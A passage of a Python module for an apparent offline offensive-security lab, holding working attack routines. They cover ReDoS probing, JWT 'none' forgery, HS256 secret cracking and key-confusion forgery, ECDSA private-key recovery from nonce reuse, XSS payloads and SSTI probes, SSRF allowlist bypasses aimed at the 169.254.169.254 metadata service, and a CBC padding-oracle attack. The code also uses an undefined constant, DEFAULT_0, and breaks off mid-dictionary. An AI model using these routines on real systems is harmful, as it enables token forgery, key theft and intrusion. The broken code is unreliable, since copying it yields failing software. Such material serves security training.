#!/usr/bin/env python3
"""Attestor Offensive Lab 4.2 -- bounded offensive-security exercises.

Boundaries (house contract):
- Offline only: no network access, no sockets, no subprocesses.
- Operates on operator-supplied material or bundled synthetic simulations.
- Results are labeled as evidence for review; they never claim that any real,
  third-party, or production target is exploitable.
- Local code execution exists only in detector/offensive_fuzz42.py behind
  explicit authorization flags.
- Exit codes follow house convention: 0 clean/success-no-finding, 1 finding
  confirmed, 2 invalid usage, 3 gated/incomplete, 4 operational failure.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac as _hmac
import json
import sqlite3
import sys

try:
    from re import _parser as _rp  # Python 3.11+
    from re import _constants as _rc
except ImportError:  # pragma: no cover - older interpreters
    import sre_parse as _rp  # type: ignore
    import sre_constants as _rc  # type: ignore

LAB_SCHEMA = "attestor-offensive-lab-4.2"
EXIT_CLEAN = 0
EXIT_FINDING = 1
EXIT_INVALID = 2
EXIT_OPERATIONAL = 4


class LabError(ValueError):
    """Operator-visible invalid input."""


class UnsupportedPattern(LabError):
    pass


def canonical_json(obj) -> str:
    return json.dumps(obj, sort_keys=True, separators=(",", ":"))


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def b64u_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


# ------------------------------------------------------------------ redos

class StepBudget(Exception):
    pass


def compile_pattern(pattern: str):
    try:
        tree = _rp.parse(pattern)
    except Exception as exc:
        raise UnsupportedPattern("cannot parse pattern: %s" % exc)
    return ("seq", [_node(tok) for tok in tree])


def _seq(sp):
    return ("seq", [_node(tok) for tok in sp])


def _in_predicate(items):
    negate = False
    chars = set()
    ranges = []
    preds = []
    for iop, iav in items:
        if iop == _rc.NEGATE:
            negate = True
        elif iop == _rc.LITERAL:
            chars.add(chr(iav))
        elif iop == _rc.RANGE:
            ranges.append((chr(iav[0]), chr(iav[1])))
        elif iop == _rc.CATEGORY:
            if iav == _rc.CATEGORY_DIGIT:
                preds.append(str.isdigit)
            elif iav == _rc.CATEGORY_NOT_DIGIT:
                preds.append(lambda c: not c.isdigit())
            elif iav == _rc.CATEGORY_WORD:
                preds.append(lambda c: c.isalnum() or c == "_")
            elif iav == _rc.CATEGORY_NOT_WORD:
                preds.append(lambda c: not (c.isalnum() or c == "_"))
            elif iav == _rc.CATEGORY_SPACE:
                preds.append(str.isspace)
            elif iav == _rc.CATEGORY_NOT_SPACE:
                preds.append(lambda c: not c.isspace())
            else:
                raise UnsupportedPattern("category")
        else:
            raise UnsupportedPattern("class item")

    def pred(c):
        hit = (c in chars
               or any(lo <= c <= hi for lo, hi in ranges)
               or any(p(c) for p in preds))
        return hit != negate

    return pred


def _node(tok):
    op, av = tok[0], tok[1]
    if op == _rc.LITERAL:
        return ("lit", chr(av))
    if op == _rc.NOT_LITERAL:
        return ("nlit", chr(av))
    if op == _rc.ANY:
        return ("any",)
    if op == _rc.IN:
        return ("in", _in_predicate(av))
    if op == _rc.MAX_REPEAT or op == _rc.MIN_REPEAT:
        lo, hi, body = av
        return ("rep", lo, hi, op == _rc.MIN_REPEAT, _seq(body))
    if op == _rc.BRANCH:
        _, branches = av
        return ("alt", [_seq(b) for b in branches])
    if op == _rc.SUBPATTERN:
        return _seq(av[3])
    if op == _rc.AT:
        if av in (_rc.AT_BEGINNING, _rc.AT_BEGINNING_STRING):
            return ("bol",)
        if av in (_rc.AT_END, _rc.AT_END_STRING):
            return ("eol",)
        raise UnsupportedPattern("anchor kind")
    if op == _rc.ASSERT or op == _rc.ASSERT_NOT:
        raise UnsupportedPattern("lookaround")
    raise UnsupportedPattern("opcode %r" % (op,))


def _m(nodes, idx, pos, k, ctx):
    ctx["n"] += 1
    if ctx["n"] > ctx["cap"]:
        raise StepBudget()
    if idx == len(nodes):
        return k(pos)
    node = nodes[idx]
    kind = node[0]
    s = ctx["s"]

    def rest(p):
        return _m(nodes, idx + 1, p, k, ctx)

    if kind == "lit":
        if pos < len(s) and s[pos] == node[1]:
            return rest(pos + 1)
        return False
    if kind == "nlit":
        if pos < len(s) and s[pos] != node[1]:
            return rest(pos + 1)
        return False
    if kind == "any":
        if pos < len(s) and s[pos] != "\n":
            return rest(pos + 1)
        return False
    if kind == "in":
        if pos < len(s) and node[1](s[pos]):
            return rest(pos + 1)
        return False
    if kind == "seq":
        return _m(node[1], 0, pos, rest, ctx)
    if kind == "alt":
        for branch in node[1]:
            if _m(branch[1], 0, pos, rest, ctx):
                return True
        return False
    if kind == "rep":
        _, lo, hi, lazy, body = node
        return _rep(body, lo, hi, lazy, pos, rest, ctx, 0)
    if kind == "bol":
        if pos == 0:
            return rest(pos)
        return False
    if kind == "eol":
        if pos == len(s):
            return rest(pos)
        return False
    raise UnsupportedPattern(kind)


def _rep(body, lo, hi, lazy, pos, k, ctx, count):
    ctx["n"] += 1
    if ctx["n"] > ctx["cap"]:
        raise StepBudget()

    def more(p2):
        if p2 == pos:
            # zero-width iteration guard: stop expanding, satisfy minimum only
            if count >= lo:
                return k(pos)
            return False
        return _rep(body, lo, hi, lazy, p2, k, ctx, count + 1)

    if not lazy:
        if count < hi and _m(body[1], 0, pos, more, ctx):
            return True
        if count >= lo:
            return k(pos)
        return False
    if count >= lo and k(pos):
        return True
    if count < hi:
        return _m(body[1], 0, pos, more, ctx)
    return False


def engine_fullmatch(compiled, text, cap=DEFAULT_0):
    ctx = {"s": text, "cap": cap, "n": 0}
    try:
        ok = _m(compiled[1], 0, 0, lambda p: p == len(text), ctx)
    except StepBudget:
        return {"matched": None, "steps": ctx["n"], "capped": True}
    return {"matched": ok, "steps": ctx["n"], "capped": False}


def _subtree_has_rep(node):
    kind = node[0]
    if kind == "rep":
        return True
    if kind == "seq":
        return any(_subtree_has_rep(ch) for ch in node[1])
    if kind == "alt":
        return any(_subtree_has_rep(br) for br in node[1])
    return False


def _first_literal(node):
    kind = node[0]
    if kind == "lit":
        return node[1]
    if kind == "seq":
        for ch in node[1]:
            got = _first_literal(ch)
            if got is not None:
                return got
        return None
    if kind == "alt":
        for br in node[1]:
            got = _first_literal(br)
            if got is not None:
                return got
        return None
    if kind == "rep":
        return _first_literal(node[4])
    return None


def _all_lits(node, out):
    kind = node[0]
    if kind == "lit":
        out.add(node[1])
    elif kind == "seq":
        for ch in node[1]:
            _all_lits(ch, out)
    elif kind == "alt":
        for br in node[1]:
            _all_lits(br, out)
    elif kind == "rep":
        _all_lits(node[4], out)


def _branches_overlap(branches):
    sets = []
    for br in branches:
        s = set()
        _all_lits(br, s)
        sets.append(s)
    for i in range(len(sets)):
        for j in range(i + 1, len(sets)):
            if sets[i] & sets[j]:
                return True
    return False


def _can_be_empty(node):
    kind = node[0]
    if kind == "seq":
        return all(_can_be_empty(ch) for ch in node[1])
    if kind == "alt":
        return any(_can_be_empty(br) for br in node[1])
    if kind == "rep":
        return node[1] == 0
    return False


def _alt_ambiguous(branches):
    """An alternation inside a quantified body is ambiguous when two
    branches share leading content, or when one branch can match empty
    (sre_parse rewrites (a|aa) into a(?:|a), which lands here)."""
    infos = []
    for branch in branches:
        chars = set()
        _all_lits(branch, chars)
        infos.append((chars, _can_be_empty(branch)))
    for i in range(len(infos)):
        for j in range(i + 1, len(infos)):
            shared = infos[i][0] & infos[j][0]
            if shared or infos[i][1] or infos[j][1]:
                return True
    return False


def _find_alt(node):
    kind = node[0]
    if kind == "alt":
        return node
    if kind == "seq":
        for child in node[1]:
            found = _find_alt(child)
            if found:
                return found
        return None
    if kind == "rep":
        return _find_alt(node[4])
    return None


def find_hotspot(node):
    kind = node[0]
    if kind == "rep":
        body = node[4]
        if _subtree_has_rep(body):
            return node, "nested-quantifier"
        alt = _find_alt(body)
        if alt and _alt_ambiguous(alt[1]):
            return node, "alternation-overlap"
        hot = find_hotspot(body)
        if hot:
            return hot
        return None
    if kind == "seq":
        for ch in node[1]:
            hot = find_hotspot(ch)
            if hot:
                return hot
        return None
    if kind == "alt":
        for br in node[1]:
            hot = find_hotspot(br)
            if hot:
                return hot
        return None
    return None


def analyze_redos(pattern, lengths=(6, 9, 12), cap=DEFAULT_0):
    compiled = compile_pattern(pattern)
    report = {
        "schema": LAB_SCHEMA,
        "tool": "redos-synthesizer",
        "pattern": pattern,
        "step_cap": cap,
    }
    hot = find_hotspot(compiled)
    if not hot:
        report.update({
            "shape": None,
            "verdict": "no-catastrophic-shape-detected",
            "confirmed": False,
        })
        report["report_sha256"] = sha256_hex(canonical_json(report).encode())
        return report

    node, shape = hot
    unit_char = _first_literal(node[4]) or "a"
    probe_suffix = None
    for cand in ("!", "#", "~", "\x00"):
        if cand != unit_char:
            small = engine_fullmatch(compiled, unit_char * 4 + cand, cap=50_000)
            if small["matched"] is False:
                probe_suffix = cand
                break
    if probe_suffix is None:
        probe_suffix = "\x00"

    measurements = []
    confirmed = False
    for n in lengths:
        probe = unit_char * n + probe_suffix
        res = engine_fullmatch(compiled, probe, cap=cap)
        measurements.append({
            "length": n,
            "steps": res["steps"],
            "capped": res["capped"],
            "matched": res["matched"],
        })
        if res["capped"]:
            confirmed = True
    if not confirmed and len(measurements) >= 2:
        first = max(measurements[0]["steps"], 1)
        last = measurements[-1]["steps"]
        ratio = last / first
        report["growth_ratio"] = round(ratio, 2)
        if ratio >= 4.0:
            confirmed = True

    report.update({
        "shape": shape,
        "unit_char": unit_char,
        "probe_template": "<%r>*N + %r" % (unit_char, probe_suffix),
        "measurements": measurements,
        "verdict": "catastrophic-backtracking-confirmed" if confirmed
        else "no-blowup-observed",
        "confirmed": confirmed,
        "note": ("steps are counted by this lab's deterministic reference "
                 "backtracking engine; they evidence algorithmic blowup, not "
                 "a wall-clock claim about any particular runtime"),
    })
    digest_input = {k: v for k, v in report.items()}
    report["report_sha256"] = sha256_hex(canonical_json(digest_input).encode())
    return report


# -------------------------------------------------------------------- jwt

BUNDLED_WORDLIST = [
    "password", "123456", "secret", "shhhh", "changeme", "jwt_secret",
    "keyboard cat", "supersecret", "hunter2", "your-256-bit-secret",
    "topsecret", "letmein",
]


def jwt_split(token):
    parts = token.split(".")
    if len(parts) not in (2, 3):
        raise LabError("token does not look like a JWT")
    try:
        header = json.loads(b64u_decode(parts[0]))
        payload = json.loads(b64u_decode(parts[1]))
    except Exception as exc:
        raise LabError("undecodable token segment: %s" % exc)
    sig = b64u_decode(parts[2]) if len(parts) == 3 else b""
    return parts, header, payload, sig


def jwt_decode(token):
    parts, header, payload, sig = jwt_split(token)
    return {
        "header": header,
        "payload": payload,
        "alg": header.get("alg"),
        "signature_bytes": len(sig),
        "verified": False,
        "note": "decoded without verification; a decoded JWT is never an authenticated claim",
    }


def jwt_none_forge(token):
    parts, header, payload, _ = jwt_split(token)
    variants = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = b64u_encode(json.dumps(
            {"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
        variants.append(h + "." + parts[1] + ".")
    return {
        "variants": variants,
        "note": ("demonstration artifacts; acceptance depends entirely on the "
                 "verifier library configuration"),
    }


def load_wordlist(path):
    words = []
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        for line in handle:
            words.append(line.rstrip("\r\n"))
    return words


def jwt_crack(token, words):
    parts, header, payload, sig = jwt_split(token)
    alg = header.get("alg")
    if alg != "HS256":
        raise LabError("crack supports HS256 tokens only; token alg=%r" % (alg,))
    signing = ("%s.%s" % (parts[0], parts[1])).encode()
    tried = 0
    for word in words:
        tried += 1
        candidate = word.encode("utf-8", "surrogatepass")
        mac = _hmac.new(candidate, signing, hashlib.sha256).digest()
        if _hmac.compare_digest(mac, sig):
            return {"cracked": True, "secret": word, "tried": tried}
    return {"cracked": False, "tried": tried}


def jwt_confusion(token, key_bytes):
    parts, header, payload, _ = jwt_split(token)
    h = b64u_encode(json.dumps(
        {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    signing = h + "." + parts[1]
    mac = _hmac.new(key_bytes, signing.encode(), hashlib.sha256).digest()
    return {
        "forged_token": signing + "." + b64u_encode(mac),
        "key_source_bytes": len(key_bytes),
        "note": ("RS256->HS256 key-confusion artifact: valid only against "
                 "verifiers that use public-key material as the HMAC secret; "
                 "demonstration only"),
    }


# ------------------------------------------------------------------ ecdsa

SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_G = (
    0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
    0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8,
)
P256_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
CURVE_ORDERS = {"secp256k1": SECP256K1_N, "p256": P256_N}

DEMO_D = 0xC0FFEE1234567890ABCDEF0123456789FEDCBA9876543210DEADBEEF00000042
DEMO_K = 0x1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF


def parse_int_arg(value, name):
    try:
        return int(value, 16) if value.lower().startswith("0x") else int(value, 10)
    except ValueError as exc:
        raise LabError("%s is not an integer: %r" % (name, value)) from exc


def ec_add(p_curve, point_a, point_b):
    if point_a is None:
        return point_b
    if point_b is None:
        return point_a
    x1, y1 = point_a
    x2, y2 = point_b
    if x1 == x2 and (y1 + y2) % p_curve == 0:
        return None
    if point_a == point_b:
        slope = (3 * x1 * x1) * pow(2 * y1, -1, p_curve) % p_curve
    else:
        slope = (y2 - y1) * pow(x2 - x1, -1, p_curve) % p_curve
    x3 = (slope * slope - x1 - x2) % p_curve
    y3 = (slope * (x1 - x3) - y1) % p_curve
    return (x3, y3)


def ec_mul(p_curve, point, scalar):
    result = None
    addend = point
    while scalar:
        if scalar & 1:
            result = ec_add(p_curve, result, addend)
        addend = ec_add(p_curve, addend, addend)
        scalar >>= 1
    return result


def recover_key(r, s1, s2, z1, z2, order):
    ds = (s1 - s2) % order
    if ds == 0:
        raise LabError("s1 == s2 mod n: nonce is not recoverable this way")
    if r % order == 0:
        raise LabError("degenerate r value")
    nonce = ((z1 - z2) * pow(ds, -1, order)) % order
    private = ((s1 * nonce - z1) * pow(r, -1, order)) % order
    return nonce, private


def ecdsa_demo():
    d = DEMO_D % SECP256K1_N
    k = DEMO_K % SECP256K1_N
    z1 = int.from_bytes(hashlib.sha256(b"attestor-demo-message-one").digest(), "big") % SECP256K1_N
    z2 = int.from_bytes(hashlib.sha256(b"attestor-demo-message-two").digest(), "big") % SECP256K1_N
    r_point = ec_mul(SECP256K1_P, SECP256K1_G, k)
    r = r_point[0] % SECP256K1_N
    k_inv = pow(k, -1, SECP256K1_N)
    s1 = k_inv * (z1 + r * d) % SECP256K1_N
    s2 = k_inv * (z2 + r * d) % SECP256K1_N
    rec_k, rec_d = recover_key(r, s1, s2, z1, z2, SECP256K1_N)
    return {
        "curve": "secp256k1",
        "demo_private_key_hex": format(d, "064x"),
        "demo_nonce_hex": format(k, "064x"),
        "recovered_nonce_hex": format(rec_k, "064x"),
        "recovered_private_key_hex": format(rec_d, "064x"),
        "recovery_exact": rec_d == d and rec_k == k,
        "note": ("two signatures over different messages reused one nonce; the "
                 "private key falls out of plain modular arithmetic"),
    }


# --------------------------------------------------------- template scan

URL_ATTRS = {"href", "src", "action", "formaction", "data", "poster",
             "xlink:href"}
ATTR_NAME_MARKERS = {"th:utext", "v-html", "dangerouslysetinnerhtml"}
SSTI_MARKERS = ("<?=", "{{", "${", "{%", "<%")

PAYLOADS = {
    "body-text": ["<img src=x onerror=alert(1)>"],
    "attribute-double": ['" onmouseover="alert(1)'],
    "attribute-single": ["' onmouseover='alert(1)"],
    "unquoted-attribute": [" onmouseover=alert(1) x="],
    "url-attribute-double": ["javascript:alert(1)",
                             "data:text/html;base64,"
                             "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
    "url-attribute-single": ["javascript:alert(1)"],
    "script-block": ["</script><img src=x onerror=alert(1)>", "';alert(1)//"],
    "style-block": ["</style><img src=x onerror=alert(1)>"],
    "html-comment": ["--><img src=x onerror=alert(1)>"],
    "attribute-value": ["<img src=x onerror=alert(1)>"],
}

SSTI_PROBES = {
    "<?=": ["<?= 7*7 ?>"],
    "{{": ["{{7*7}}", "{{7*'7'}}"],
    "${": ["${7*7}"],
    "{%": ["{% if 7*7 %}49{% endif %}"],
    "<%": ["<%= 7*7 %>"],
}

MARKER_CONTEXTS = {
    "body-text": PAYLOADS["body-text"],
}


def scan_template(text):
    hits = []
    n = len(text)
    starts = [0]
    for i, ch in enumerate(text):
        if ch == "\n":
            starts.append(i + 1)

    def line_of(pos):
        lo, hi = 0, len(starts)
        while lo < hi:
            mid = (lo + hi) // 2
            if starts[mid] <= pos:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def marker_at(p):
        for marker in SSTI_MARKERS:
            if text.startswith(marker, p):
                return marker
        return None

    def record(pos, marker, context):
        hits.append({
            "line": line_of(pos),
            "marker": marker,
            "context": context,
            "payload_candidates": list(PAYLOADS.get(context, [])),
            "ssti_probes": list(SSTI_PROBES.get(marker, [])),
        })

    state = "text"
    quote = None
    attr_name = ""
    i = 0
    while i < n:
        c = text[i]
        if state == "text":
            if text.startswith("<!--", i):
                state = "comment"
                i += 4
                continue
            if c == "<":
                nxt = text[i + 1] if i + 1 < n else ""
                low = text[i:i + 8].lower()
                if nxt.isalpha():
                    if low.startswith("<script"):
                        state = "script"
                        i += 7
                        continue
                    if low.startswith("<style"):
                        state = "style"
                        i += 6
                        continue
                    state = "tag"
                    attr_name = ""
                    quote = None
                    i += 1
                    continue
                mk = marker_at(i)
                if mk:
                    record(i, mk, "body-text")
                    i += len(mk)
                    continue
            mk = marker_at(i)
            if mk:
                record(i, mk, "body-text")
                i += len(mk)
                continue
            i += 1
            continue
        if state == "comment":
            end = text.find("-->", i)
            if end < 0:
                break
            seg = text[i:end]
            for marker in SSTI_MARKERS:
                at = seg.find(marker)
                while at >= 0:
                    record(i + at, marker, "html-comment")
                    at = seg.find(marker, at + len(marker))
            i = end + 3
            state = "text"
            continue
        if state in ("script", "style"):
            closer = "</script" if state == "script" else "</style"
            context = "script-block" if state == "script" else "style-block"
            j = text.lower().find(closer, i)
            seg_end = n if j < 0 else j
            p = i
            while p < seg_end:
                mk = marker_at(p)
                if mk:
                    record(p, mk, context)
                    p += len(mk)
                else:
                    p += 1
            if j < 0:
                break
            gt = text.find(">", j)
            i = n if gt < 0 else gt + 1
            state = "text"
            continue
        # state == tag
        if quote is not None:
            mk = marker_at(i)
            if mk:
                low_attr = attr_name.lower()
                if low_attr in URL_ATTRS:
                    context = ("url-attribute-"
                               + ("double" if quote == '"' else "single"))
                elif low_attr in ATTR_NAME_MARKERS:
                    context = "attribute-value"
                else:
                    context = ("attribute-"
                               + ("double" if quote == '"' else "single"))
                record(i, mk, context)
                i += len(mk)
                continue
            if c == quote:
                quote = None
                # the value consumed this attribute name
                attr_name = ""
            i += 1
            continue
        if c in "\"'":
            quote = c
            i += 1
            continue
        if c == ">":
            if attr_name.lower() in ATTR_NAME_MARKERS:
                record(max(i - 1, 0), attr_name.lower(), "attribute-value")
            state = "text"
            attr_name = ""
            i += 1
            continue
        if c.isalnum() or c in "-:_":
            attr_name += c
            i += 1
            continue
        if attr_name.lower() in ATTR_NAME_MARKERS and c != "=":
            record(max(i - 1, 0), attr_name.lower(), "attribute-value")
        if c != "=":
            # '=' keeps the name so its quoted value can inherit the context
            attr_name = ""
        i += 1
    return hits


# ------------------------------------------------------------------- ssrf

METADATA_HOSTS = {
    "169.254.169.254": "cloud metadata service (AWS/GCP/Azure)",
    "metadata.google.internal": "GCP metadata service",
    "fd00:ec2::254": "AWS IPv6 metadata service",
}


def ip_encodings(host):
    parts = host.split(".")
    if len(parts) != 4:
        return {}
    try:
        octets = [int(p) for p in parts]
    except ValueError:
        return {}
    if any(o < 0 or o > 255 for o in octets):
        return {}
    value = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
    return {
        "decimal": str(value),
        "hex-0x": hex(value),
        "hex-bare": format(value, "x"),
        "octal": format(value, "o"),
        "octal-padded-dotted": ".".join(format(o, "04o") for o in octets),
        "mixed-dot": ".".join(hex(o) if idx % 2 else str(o)
                              for idx, o in enumerate(octets)),
    }


def ssrf_reason(url, allowlist=None, validator=None, via=None,
                evil_host="169.254.169.254"):
    from urllib.parse import urlsplit
    split = urlsplit(url)
    scheme = split.scheme or "http"
    host = split.hostname or ""
    rest = split.path or "/"
    if split.query:
        rest += "?" + split.query

    candidates = []
    notes = []

    for variant, encoded in ip_encodings(host).items():
        candidates.append({
            "class": "ip-encoding",
            "variant": variant,
            "url": "%s://%s%s" % (scheme, encoded, rest),
        })

    if host in METADATA_HOSTS:
        notes.append("target host is itself %s (%s)"
                     % (host, METADATA_HOSTS[host]))
    if "/meta-data" in rest or "/metadata" in rest:
        notes.append("path resembles a metadata-service document path")

    if allowlist:
        entries = [e.strip() for e in allowlist.split(",") if e.strip()]
        for entry in entries:
            if validator in (None, "", "exact"):
                candidates.append({
                    "class": "userinfo-trick",
                    "url": "%s://%s@%s%s" % (scheme, entry, evil_host, rest),
                })
                candidates.append({
                    "class": "trailing-dot",
                    "url": "%s://%s.%s" % (scheme, entry, rest),
                })
                candidates.append({
                    "class": "case-variation",
                    "url": "%s://%s%s" % (scheme, entry.upper(), rest),
                })
            if validator in (None, "", "suffix", "startswith"):
                compact = entry.replace(".", "-")
                candidates.append({
                    "class": "prefix-confusable",
                    "url": "%s://evil-%s.test%s" % (scheme, compact, rest),
                })
                candidates.append({
                    "class": "suffix-confusable",
                    "url": "%s://%s.evil.test%s" % (scheme, compact, rest),
                })
        if entries:
            notes.append(
                "naive host checks are compared against these shapes only; "
                "no DNS resolution, connection, or fetch was performed")

    if via:
        notes.append("redirect chain supplied: validators that authorize only "
                     "the first hop accept %s" % via)

    return {
        "schema": LAB_SCHEMA,
        "tool": "ssrf-allowlist-reasoner",
        "target": url,
        "validator": validator or "exact+suffix+startswith",
        "allowlist": allowlist,
        "candidates": candidates,
        "notes": notes,
        "boundary": "static reasoning output; nothing was contacted",
    }


# ----------------------------------------------------------------- arenas

CONFUSED_DEPUTY = {
    "entry": "caller",
    "goal": "goal.privileged-action-on-foreign-object",
    "edges": [
        ["caller", "deputy.request-relay", "supplies object_id"],
        ["deputy.request-relay", "deputy.prefix-screen",
         "name-prefix check only"],
        ["deputy.prefix-screen", "privileged.execute",
         "authority_check=False"],
        ["privileged.execute", "goal.privileged-action-on-foreign-object",
         "acts on the supplied id"],
    ],
    "fix": {"label_contains": "authority_check=False",
            "replacement": "authority_check=True"},
    "mitigation": ("bind authorization to the exact object identity "
                   "server-side and deny by default when an authority "
                   "binding is missing"),
}

CSRF_BINDING = {
    "entry": "cross-origin-form-autosubmit",
    "goal": "goal.state-change-committed",
    "edges": [
        ["cross-origin-form-autosubmit", "webapp.transfer",
         "browser auto-sends ambient session cookie"],
        ["webapp.transfer", "bank.move-funds",
         "accepted without fresh anti-CSRF token"],
        ["bank.move-funds", "goal.state-change-committed",
         "ledger updated"],
    ],
    "fix": {"label_contains": "without fresh anti-CSRF token",
            "replacement": "requires fresh per-request token bound to session+action"},
    "mitigation": ("require a fresh per-request CSRF token bound to the "
                   "session and exact action; SameSite cookies as "
                   "defense-in-depth"),
}

ARENAS = {"confused-deputy": CONFUSED_DEPUTY, "csrf-binding": CSRF_BINDING}
ARENA_0 = 8


def arena_paths(graph, edges=None, max_depth=ARENA_0):
    adjacency = {}
    for src, dst, label in (edges if edges is not None else graph["edges"]):
        adjacency.setdefault(src, []).append((dst, label))

    paths = []
    start = graph["entry"]
    goal = graph["goal"]

    def dfs(node, path):
        if len(path) > max_depth:
            return
        if node == goal:
            paths.append(list(path))
            return
        for nxt, label in sorted(adjacency.get(node, [])):
            if nxt in path:
                continue
            path.append(nxt)
            dfs(nxt, path)
            path.pop()

    dfs(start, [start])
    return paths


def apply_arena_fix(graph):
    """Patched policy view: transitions carrying the planted defect are
    denied outright (the recommended mitigation denies by default when the
    required binding is missing), so those edges are removed."""
    needle = graph["fix"]["label_contains"]
    return [edge for edge in graph["edges"] if needle not in edge[2]]


def run_arena(scenario, with_fix=False):
    if scenario not in ARENAS:
        raise LabError("unknown arena scenario: %r" % (scenario,))
    graph = ARENAS[scenario]
    pre = arena_paths(graph)
    post = arena_paths(graph, edges=apply_arena_fix(graph))
    vulnerable = bool(pre) and not post
    replay_verified = (pre == arena_paths(graph)) and (post == arena_paths(
        graph, edges=apply_arena_fix(graph)))
    return {
        "schema": LAB_SCHEMA,
        "tool": "policy-graph-arena",
        "scenario": scenario,
        "vulnerable_path_pre_fix": pre,
        "paths_post_fix": post,
        "planted_defect_confirmed": bool(pre) and not post and vulnerable,
        "replay_verified": replay_verified,
        "with_fix": with_fix,
        "mitigation": graph["mitigation"],
        "boundary": ("compiled in-memory policy graphs only; no process, "
                     "network, filesystem, or real authorization system was "
                     "involved"),
    }


# --------------------------------------------------------- padding oracle

BLOCK = 16
HALF = 8
ROUNDS = 8
LAB_KEY = hashlib.sha256(b"attestor-offensive-lab-key-4.2").digest()[:16]


def _xor(left, right):
    return bytes(a ^ b for a, b in zip(left, right))


def _round(half, rnd):
    return hashlib.sha256(bytes([rnd]) + half).digest()[:HALF]


def feistel_encrypt_block(block):
    left, right = block[:HALF], block[HALF:]
    for rnd in range(ROUNDS):
        left, right = right, _xor(left, _round(right, rnd))
    return left + right


def feistel_decrypt_block(block):
    left, right = block[:HALF], block[HALF:]
    for rnd in reversed(range(ROUNDS)):
        left, right = _xor(right, _round(left, rnd)), left
    return left + right


def pkcs7_pad(data):
    pad_len = BLOCK - (len(data) % BLOCK)
    return data + bytes([pad_len]) * pad_len


def pkcs7_unpad(data):
    if not data or len(data) % BLOCK:
        raise LabError("bad padded input length")
    pad_len = data[-1]
    if pad_len < 1 or pad_len > BLOCK or data[-pad_len:] != bytes([pad_len]) * pad_len:
        raise LabError("invalid PKCS#7 padding")
    return data[:-pad_len]


def cbc_encrypt(plaintext, iv):
    prev = iv
    padded = pkcs7_pad(plaintext)
    out = b""
    for off in range(0, len(padded), BLOCK):
        block = _xor(padded[off:off + BLOCK], prev)
        cipher = feistel_encrypt_block(block)
        out += cipher
        prev = cipher
    return out


def cbc_decrypt(ciphertext, iv):
    prev = iv
    out = b""
    for off in range(0, len(ciphertext), BLOCK):
        block = ciphertext[off:off + BLOCK]
        plain = _xor(feistel_decrypt_block(block), prev)
        out += plain
        prev = block
    return out


def make_oracle(iv, key=None):
    def oracle(candidate_iv, block):
        plain = cbc_decrypt(block, candidate_iv)
        pad_len = plain[-1]
        return 1 <= pad_len <= BLOCK and plain[-pad_len:] == bytes([pad_len]) * pad_len
    return oracle


def padding_oracle_attack(ciphertext, iv, oracle):
    blocks = [ciphertext[o:o + BLOCK] for o in range(0, len(ciphertext), BLOCK)]
    budget = 256 * BLOCK * len(blocks) + BLOCK
    queries = 0
    recovered = b""
    prev = iv
    for b_index, block in enumerate(blocks):
        intermediate = bytearray(BLOCK)
        for pos in range(BLOCK - 1, -1, -1):
            pad_value = BLOCK - pos
            craft = bytearray(prev)
            for j in range(pos + 1, BLOCK):
                craft[j] = intermediate[j] ^ pad_value
            found = False
            for guess in range(256):
                craft[pos] = guess
                queries += 1
                if queries > budget:
                    raise LabError("oracle query budget exceeded")
                if not oracle(bytes(craft), block):
                    continue
                ok = True
                if pos == BLOCK - 1:
                    craft[pos - 1] ^= 0xFF
                    queries += 1
                    ok = oracle(bytes(craft), block)
                    craft[pos - 1] ^= 0xFF
                if ok:
                    intermediate[pos] = guess ^ pad_value
                    found = True
                    break
            if not found:
                raise LabError("padding-oracle attack stalled at block %d byte %d"
                               % (b_index, pos))
        recovered += bytes(intermediate[j] ^ prev[j] for j in range(BLOCK))
        prev = block
    return {
        "padded_plaintext": recovered,
        "queries_used": queries,
        "query_budget": budget,
    }


def padding_oracle_demo(message=b"TRANSFER 9000 TO ACCT 7"):
    message = message.encode() if isinstance(message, str) else message
    iv = bytes(range(16))
    ciphertext = cbc_encrypt(message, iv)
    oracle = make_oracle(iv)
    result = padding_oracle_attack(ciphertext, iv, oracle)
    stripped = pkcs7_unpad(result["padded_plaintext"])
    return {
        "schema": LAB_SCHEMA,
        "tool": "cbc-padding-oracle-simulator",
        "cipher": "bundled 16-byte Feistel construction (not AES)",
        "message": message.decode("ascii", "replace"),
        "recovered": stripped.decode("ascii", "replace"),
        "exact_recovery": stripped == message,
        "queries_used": result["queries_used"],
        "query_budget": result["query_budget"],
        "note": ("the oracle answers one bit per query exactly like a remote "
                 "padding oracle; everything here is in-memory and local"),
    }


# ----------------------------------------------------------- gadget chain

DANGEROUS_SINK_KINDS = {"code-exec", "cmd-exec", "fs-write", "sql-exec",
                        "net-conn"}

BUNDLED_GADGET_GRAPH = {
    "entries": ["pickle.loads", "ObjectInputStream.readObject",
                "unserialize"],
    "edges": [
        ["pickle.loads", "__reduce__"],
        ["__reduce__", "builtins.eval"],
        ["pickle.loads", "__setstate__"],
        ["__setstate__", "os.system"],
        ["ObjectInputStream.readObject", "resolveClass"],
        ["resolveClass", "Runtime.exec"],
        ["unserialize", "__wakeup"],
        ["__wakeup", "file_put_contents"],
        ["unserialize", "logger.info"],
    ],
    "sinks": {
        "builtins.eval": "code-exec",
        "os.system": "cmd-exec",
        "Runtime.exec": "cmd-exec",
        "file_put_contents": "fs-write",
        "logger.info": "log",
